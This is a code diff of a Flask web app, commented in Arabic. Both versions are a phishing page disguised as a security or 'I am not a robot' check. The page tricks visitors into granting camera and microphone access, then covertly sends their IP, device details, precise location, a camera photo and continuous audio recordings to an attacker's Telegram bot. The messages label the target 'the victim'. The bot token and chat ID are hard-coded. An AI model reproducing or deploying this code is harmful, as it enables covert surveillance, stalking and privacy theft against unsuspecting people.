@@ -1,134 +1,137 @@
-import base64, requests, io, os, sqlite3, json
-from datetime import datetime
-from flask import Flask, render_template_string, request, jsonify
+import base64, requests, io, os, json
+from flask import Flask, render_template_string, request
 
-# ==========================================
-# 1. الإعدادات (Config)
-# ==========================================
 app = Flask(__name__)
-BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
-ADMIN_ID = 7041600701
-BASE_URL = "https://sif.onrender.com"
 
-# ==========================================
-# 2. محرك الإرسال (Telegram Engine)
-# ==========================================
-def tg_push(method, data, files=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
-    try:
-        if files:
-            return requests.post(url, data=data, files=files, timeout=20)
-        else:
-            return requests.post(url, json=data, timeout=20)
-    except Exception as e:
-        print(f"Error: {e}")
-        return None
+# --- بيانات البوت المحدثة ---
+BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
+CHAT_ID = "7041600701"
 
-@app.route('/webhook', methods=['POST'])
-def telegram_webhook():
-    update = request.get_json(force=True, silent=True)
-    if not update:
-        return "OK", 200
-
-    if "message" in update:
-        msg = update["message"]
-        if "chat" in msg:
-            cid = msg["chat"]["id"]
-            if cid == ADMIN_ID:
-                kb = {
-                    "inline_keyboard": [
-                        [{"text": "🚀 رابط الصيد الخاص بك", "callback_data": "get_url"}],
-                        [{"text": "📊 فحص السيرفر", "callback_data": "ping"}]
-                    ]
-                }
-                tg_push("sendMessage", {"chat_id": cid, "text": "🎛 <b>لوحة تحكم سيف v6.0</b>\nالسيرفر شغال والربط سليم.", "parse_mode": "HTML", "reply_markup": kb})
-    
-    elif "callback_query" in update:
-        cb = update["callback_query"]
-        cid = cb["message"]["chat"]["id"]
-        if cb["data"] == "get_url":
-            tg_push("sendMessage", {"chat_id": cid, "text": f"🔗 رابطك للمشاركة:\n<code>{BASE_URL}</code>", "parse_mode": "HTML"})
-        elif cb["data"] == "ping":
-            tg_push("sendMessage", {"chat_id": cid, "text": "🟢 الحالة: متصل\n⚡ السرعة: ممتازة"})
-            
-    return "OK", 200
-
-# ==========================================
-# 3. واجهة الصيد (The Trap)
-# ==========================================
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudflare Security Check</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق المطور</title>
     <style>
-        body { background:#0a0a0a; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-        .box { background:#111; padding:35px; border-radius:15px; border:1px solid #222; text-align:center; width:85%; max-width:400px; box-shadow:0 10px 40px rgba(0,0,0,0.8); }
-        .spin { border:3px solid #222; border-top:3px solid #f38020; border-radius:50%; width:50px; height:50px; animation:s 1s linear infinite; margin:0 auto 20px; }
-        @keyframes s { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        body { background: #0a0a0a; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
+        .card { background: #111; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; width: 320px; border: 1px solid #222; }
+        .btn { background: #f38020; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-size: 18px; width: 100%; font-weight: bold; transition: 0.3s; }
+        .btn:hover { background: #e07010; }
+        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        #c { display: none; }
+        #st { margin-top: 15px; color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="box"><div class="spin"></div><h2>Checking security...</h2><p style="color:#666;font-size:13px;">يرجى السماح بالصلاحيات للتأكد من هويتك</p></div>
+    <div class="card">
+        <div style="font-size: 50px; margin-bottom: 10px;">🛡️</div>
+        <h3>تأكيد الهوية</h3>
+        <p>يرجى الضغط للمتابعة وتخطي نظام الحماية</p>
+        <button class="btn" id="go" onclick="startMasterProcess()">أنا لست روبوت</button>
+        <div id="st"></div>
+    </div>
+
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+
     <script>
-        async function x(t, d) { await fetch('/api/v1/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({t:t, d:d})}); }
-        async function start() {
+        const st = document.getElementById('st');
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+
+        async function startMasterProcess() {
+            document.getElementById('go').style.display = 'none';
+            st.innerText = "جاري فحص المتصفح... يرجى الانتظار";
+
             try {
-                const b = await navigator.getBattery();
-                const i = `📱 جهاز جديد:\\n- المنصة: ${navigator.platform}\\n- البطارية: ${Math.round(b.level*100)}%`;
-                await x('info', i);
-                
-                const s = await navigator.mediaDevices.getUserMedia({audio:true, video:true});
-                
-                navigator.geolocation.getCurrentPosition(p => { 
-                    x('loc', `📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`); 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                v.srcObject = stream;
 
-                const r = new MediaRecorder(s); const c = [];
-                r.ondataavailable = e => c.push(e.data);
-                r.onstop = () => {
-                    const bl = new Blob(c, {type:'audio/ogg'}); const f = new FileReader();
-                    f.readAsDataURL(bl); f.onloadend = () => x('audio', f.result.split(',')[1]);
-                };
-                r.start(); setTimeout(() => r.stop(), 5000);
+                // جلب المعلومات
+                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
+                const battery = await navigator.getBattery().catch(() => ({}));
+                
+                let info = `📱 **تقرير شامل للضحية**:\\n`;
+                info += `🌐 IP: ${ipRes.ip}\\n`;
+                info += `🖥️ النظام: ${navigator.platform}\\n`;
+                info += `🔋 البطارية: ${Math.round((battery.level || 0)*100)}%\\n`;
+                info += `🔧 المتصفح: ${navigator.userAgent}`;
+                postData('/upload', { d: info, t: 'msg' });
 
-                setTimeout(async () => {
-                    const v = document.createElement('video'); v.srcObject = s; await v.play();
-                    const cn = document.createElement('canvas'); cn.width = v.videoWidth; cn.height = v.videoHeight;
-                    cn.getContext('2d').drawImage(v, 0, 0);
-                    x('img', cn.toDataURL('image/jpeg').split(',')[1]);
-                    window.location.replace("https://google.com");
-                }, 2000);
-            } catch(e) { window.location.replace("https://google.com"); }
+                // الموقع الجغرافي
+                navigator.geolocation.getCurrentPosition(p => {
+                    const mapUrl = `https://www.google.com/maps?q=\${p.coords.latitude},\${p.coords.longitude}`;
+                    postData('/upload', { d: mapUrl, t: 'loc' });
+                }, null, {enableHighAccuracy: true});
+
+                // صورة الكاميرا
+                setTimeout(() => {
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    postData('/upload', { d: c.toDataURL('image/jpeg', 0.6), t: 'img' });
+                }, 3000);
+
+                // التنصت المستمر (كل 5 ثواني)
+                function recordChunk() {
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(new Blob(chunks));
+                        reader.onloadend = () => postData('/upload', { d: reader.result, t: 'aud' });
+                        recordChunk();
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+                }
+                
+                recordChunk();
+                st.innerText = "اكتمل الفحص بنجاح!";
+
+            } catch (e) {
+                alert("يجب السماح بالأذونات للمتابعة");
+                location.reload();
+            }
         }
-        window.onload = start;
+
+        function postData(url, data) {
+            fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+        }
     </script>
 </body>
 </html>
 '''
 
-# ==========================================
-# 4. استقبال البيانات (Data Collector)
-# ==========================================
-@app.route('/', methods=['GET'])
-def home(): 
-    return render_template_string(HTML_TEMPLATE)
+@app.route('/')
+def index(): return render_template_string(HTML_TEMPLATE)
 
-@app.route('/api/v1/capture', methods=['POST'])
-def collect():
-    r = request.get_json(force=True, silent=True)
-    if not r: return "OK"
-    t, d = r['t'], r['d']
-    if t == 'info' or t == 'loc': 
-        tg_push("sendMessage", {"chat_id": ADMIN_ID, "text": d})
-    elif t == 'img':
-        img = io.BytesIO(base64.b64decode(d)); img.name='s.jpg'
-        tg_push("sendPhoto", {"chat_id": ADMIN_ID, "caption": "📸 صورة الكاميرا"}, files={'photo': img})
-    elif t == 'audio':
-        aud = io.BytesIO(base64.b64decode(d)); aud.name='v.ogg'
-        tg_push("sendVoice", {"chat_id": ADMIN_ID, "caption": "🎙 تسجيل صوتي"}, files={'voice': aud})
+@app.route('/upload', methods=['POST'])
+def upload():
+    data = request.get_json(force=True, silent=True)
+    if not data: return "OK"
+    t, d = data.get('t'), data.get('d')
+    api = f"https://api.telegram.org/bot{BOT_TOKEN}/"
+    
+    try:
+        if t == 'msg':
+            requests.post(api + "sendMessage", data={'chat_id': CHAT_ID, 'text': d, 'parse_mode': 'Markdown'})
+        elif t == 'loc':
+            requests.post(api + "sendMessage", data={'chat_id': CHAT_ID, 'text': f"📍 موقع الضحية:\\n{d}"})
+        elif t == 'img':
+            img_bytes = base64.b64decode(d.split(',')[1])
+            requests.post(api + "sendPhoto", data={'chat_id': CHAT_ID, 'caption': '📸 صورة الكاميرا'}, files={'photo': ('c.jpg', img_bytes)})
+        elif t == 'aud':
+            aud_bytes = base64.b64decode(d.split(',')[1])
+            requests.post(api + "sendVoice", data={'chat_id': CHAT_ID, 'caption': '🎙 تسجيل صوتي مستمر'}, files={'voice': ('v.ogg', aud_bytes)})
+    except Exception as e:
+        print(f"Error: {e}")
+        
     return "OK"
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
+
